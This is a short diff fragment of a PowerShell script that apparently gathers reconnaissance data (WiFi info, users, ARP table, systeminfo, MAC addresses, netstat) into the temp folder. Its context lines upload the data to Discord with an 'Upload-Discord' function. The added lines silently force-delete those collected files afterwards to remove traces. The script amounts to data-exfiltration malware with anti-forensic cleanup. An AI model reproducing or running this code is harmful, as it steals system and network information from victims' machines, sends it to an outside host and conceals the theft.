@@ -61,7 +61,13 @@ Upload-Discord -file $env:TMP\arp.txt
 Upload-Discord -file $env:TMP\systeminfo.txt
 Upload-Discord -file $env:TMP\mac.txt
 Upload-Discord -file $env:TMP\netstat.txt
-
+rm "$env:TMP\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\ipconfig.txt.csv" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\users.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\arp.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\mac.txt" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\netstat.txt" -r -Force -ErrorAction SilentlyContinue
 
 
 
